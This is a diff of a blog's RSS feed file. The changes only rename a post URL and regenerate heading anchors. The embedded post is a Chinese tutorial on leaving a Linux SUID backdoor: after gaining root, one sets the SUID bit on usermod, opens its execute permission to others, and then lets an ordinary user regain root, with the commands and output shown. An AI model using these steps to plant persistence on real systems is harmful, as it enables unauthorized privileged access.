@@ -12,17 +12,17 @@
     
     <item>
       <title>Linux之SUID后门</title>
-      <link>http://wyb0.com/posts/Linux%E4%B9%8BSUID%E5%90%8E%E9%97%A8/</link>
+      <link>http://wyb0.com/posts/linux-suid-back-door/</link>
       <pubDate>Mon, 18 Apr 2016 20:03:07 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/Linux%E4%B9%8BSUID%E5%90%8E%E9%97%A8/</guid>
+      <guid>http://wyb0.com/posts/linux-suid-back-door/</guid>
       <description>
 
 &lt;p&gt;SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制：&lt;/p&gt;
 
 &lt;hr /&gt;
 
-&lt;h2 id=&#34;为二进制文件添加s权限从而提升为root权限方法:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;为二进制文件添加s权限从而提升为root权限方法：&lt;/h2&gt;
+&lt;h2 id=&#34;为二进制文件添加s权限从而提升为root权限方法:f87825174aad6ebe6917d1ff4fc658fd&#34;&gt;为二进制文件添加s权限从而提升为root权限方法：&lt;/h2&gt;
 
 &lt;ol&gt;
 &lt;li&gt;写sudoers添加用户  &lt;code&gt;//最佳方案&lt;/code&gt;&lt;br /&gt;&lt;/li&gt;
@@ -33,9 +33,9 @@
 
 &lt;hr /&gt;
 
-&lt;h2 id=&#34;suid-这个东西主要是留后门:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;SUID:这个东西主要是留后门&lt;/h2&gt;
+&lt;h2 id=&#34;suid-这个东西主要是留后门:f87825174aad6ebe6917d1ff4fc658fd&#34;&gt;SUID:这个东西主要是留后门&lt;/h2&gt;
 
-&lt;h4 id=&#34;在root权限下给usermod一个s权限:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;在root权限下给usermod一个s权限：&lt;/h4&gt;
+&lt;h4 id=&#34;在root权限下给usermod一个s权限:f87825174aad6ebe6917d1ff4fc658fd&#34;&gt;在root权限下给usermod一个s权限：&lt;/h4&gt;
 
 &lt;pre&gt;&lt;code&gt;# which usermod   //得到usermod的路径                             
 /usr/sbin/usermod
@@ -44,14 +44,14 @@
 -rwsr-x---. 1 root root 98680 Dec  7  2011 /usr/sbin/usermod
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h4 id=&#34;usermod给其他人一个x权限:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;usermod给其他人一个x权限：&lt;/h4&gt;
+&lt;h4 id=&#34;usermod给其他人一个x权限:f87825174aad6ebe6917d1ff4fc658fd&#34;&gt;usermod给其他人一个x权限：&lt;/h4&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# chmod o+x /usr/sbin/usermod
 [root@localhost ~]# ls -l /usr/sbin/usermod
 -rwsr-x--x. 1 root root 98680 Dec  7  2011 /usr/sbin/usermod
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h4 id=&#34;切换到普通用户wyb:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;切换到普通用户wyb：&lt;/h4&gt;
+&lt;h4 id=&#34;切换到普通用户wyb:f87825174aad6ebe6917d1ff4fc658fd&#34;&gt;切换到普通用户wyb：&lt;/h4&gt;
 
 &lt;pre&gt;&lt;code&gt;    [wyb@localhost ~]$ id wyb
     uid=500(wyb) gid=500(wyb) groups=500(wyb)
@@ -61,7 +61,7 @@
     [wyb@localhost ~]$ exit
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h4 id=&#34;验证:da3072bab4d9e8d4e5a3a1c0b146cae2&#34;&gt;验证：&lt;/h4&gt;
+&lt;h4 id=&#34;验证:f87825174aad6ebe6917d1ff4fc658fd&#34;&gt;验证：&lt;/h4&gt;
 
 &lt;pre&gt;&lt;code&gt;重新用wyb连接，此时即为root权限
 [wyb@localhost ~]$ cd /root  //若能切换到此目录即证明确实获得了root权限
